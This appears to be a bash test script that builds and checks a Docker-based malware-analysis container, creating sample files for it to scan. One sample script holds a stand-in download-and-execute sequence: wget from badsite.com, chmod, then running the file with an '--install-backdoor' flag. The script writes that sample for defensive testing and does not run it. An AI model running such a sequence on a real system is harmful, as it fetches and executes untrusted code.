#!/bin/bash

# Test script to validate MalwareAnalyzer build and functionality
# Run this script to verify the container builds correctly and basic functionality works

set -e

echo "=== MalwareAnalyzer Build and Test Script ==="
echo "Starting validation at $(date)"
echo ""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Test functions
test_passed() {
    echo -e "${GREEN}✓ PASSED:${NC} $1"
}

test_failed() {
    echo -e "${RED}✗ FAILED:${NC} $1"
    exit 1
}

test_info() {
    echo -e "${BLUE}INFO:${NC} $1"
}

test_warning() {
    echo -e "${YELLOW}⚠ WARNING:${NC} $1"
}

# Create test directory
TEST_DIR="./test_samples"
mkdir -p "$TEST_DIR"

# Create sample test files for analysis
echo "Creating test files..."

# Create a simple text file
echo "This is a test file with some strings like http://malicious.example.com and suspicious patterns" > "$TEST_DIR/test.txt"

# Create a simple shell script (will be detected as executable)
cat > "$TEST_DIR/test_script.sh" << 'EOF'
#!/bin/bash
echo "Test script"
# This contains some suspicious patterns
wget http://badsite.com/malware.exe
chmod +x malware.exe
./malware.exe --install-backdoor
EOF
chmod +x "$TEST_DIR/test_script.sh"

# Create a simple PDF-like file (header only, for testing file detection)
echo "%PDF-1.4" > "$TEST_DIR/test.pdf"
echo "This is a fake PDF file for testing purposes" >> "$TEST_DIR/test.pdf"

# Create a simple binary file with some content
python3 -c "
import struct
with open('$TEST_DIR/test_binary.bin', 'wb') as f:
    f.write(b'\x4d\x5a\x90\x00')  # MZ header (PE signature start)
    f.write(b'This is test binary content with strings')
    f.write(b'\x00' * 100)
" 2>/dev/null || echo "Could not create binary test file (python3 not available)"

test_info "Created test files in $TEST_DIR"

# Test 1: Check Docker availability
echo ""
echo "Test 1: Checking Docker availability..."
if command -v docker &> /dev/null; then
    test_passed "Docker is available"
else
    test_failed "Docker is not available or not in PATH"
fi

# Test 2: Check docker-compose availability  
echo ""
echo "Test 2: Checking docker-compose availability..."
if command -v docker-compose &> /dev/null; then
    test_passed "docker-compose is available"
elif docker compose version &> /dev/null; then
    test_passed "docker compose (v2) is available"
    DOCKER_COMPOSE="docker compose"
else
    test_warning "docker-compose not found, will use docker commands"
    DOCKER_COMPOSE=""
fi

# Test 3: Build the container
echo ""
echo "Test 3: Building MalwareAnalyzer container..."
if docker build -t malware-analyzer-test . ; then
    test_passed "Container built successfully"
else
    test_failed "Container build failed"
fi

# Test 4: Test container functionality with sample files
echo ""
echo "Test 4: Testing container with sample files..."

# Copy test files to current directory for analysis
cp -r "$TEST_DIR"/* .

# Run the container
if docker run --rm -v "$(pwd):/analysis" malware-analyzer-test; then
    test_passed "Container executed successfully"
else
    test_failed "Container execution failed"
fi

# Test 5: Verify results were generated
echo ""
echo "Test 5: Checking if results were generated..."
if ls results/analysis_log_*.txt &> /dev/null; then
    test_passed "Analysis log file generated"
else
    test_failed "No analysis log file found"
fi

if ls results/analysis_summary_*.txt &> /dev/null; then
    test_passed "Analysis summary file generated"
else
    test_failed "No analysis summary file found"  
fi

if ls results/*analysis*.txt &> /dev/null; then
    RESULT_COUNT=$(ls results/*analysis*.txt | wc -l)
    test_passed "Generated $RESULT_COUNT analysis result files"
else
    test_failed "No analysis result files found"
fi

# Test 6: Basic content validation
echo ""
echo "Test 6: Validating result content..."
if ls results/analysis_summary_*.txt &> /dev/null; then
    SUMMARY_FILE=$(ls results/analysis_summary_*.txt | head -n1)
    if grep -q "MALWARE ANALYSIS SUMMARY" "$SUMMARY_FILE"; then
        test_passed "Summary file contains expected content"
    else
        test_warning "Summary file may not contain expected content"
    fi
    
    # Show summary for verification
    echo ""
    test_info "Analysis Summary Content:"
    echo "----------------------------------------"
    cat "$SUMMARY_FILE"
    echo "----------------------------------------"
fi

# Test 7: Check if specific analysis types were performed
echo ""
echo "Test 7: Verifying specific analysis types..."

if ls results/general_analysis_*.txt &> /dev/null; then
    test_passed "General analysis files generated"
fi

if ls results/antivirus_scan_*.txt &> /dev/null; then
    test_passed "Antivirus scan files generated"  
fi

# Cleanup test files from main directory
echo ""
echo "Cleaning up test files from main directory..."
rm -f test.txt test_script.sh test.pdf test_binary.bin 2>/dev/null || true

echo ""
echo "=== Test Results Summary ==="
if ls results/ &> /dev/null; then
    echo "✓ Results directory created with analysis files"
    echo "✓ Container builds and runs successfully"
    echo "✓ Basic analysis functionality confirmed"
    echo ""
    echo "Generated files:"
    ls -la results/
else
    echo "✗ No results generated - check for errors above"
fi

echo ""
echo "=== Build and Test Complete ==="
echo "The MalwareAnalyzer container is ready for use!"
echo ""
echo "To run analysis on your own files:"
echo "1. Copy suspicious files to this directory"
echo "2. Run: docker-compose up --build"
echo "3. Check results in the ./results/ directory"
echo ""

# Keep test samples directory for reference
echo "Test samples are preserved in: $TEST_DIR"
echo "You can use these for additional testing if needed."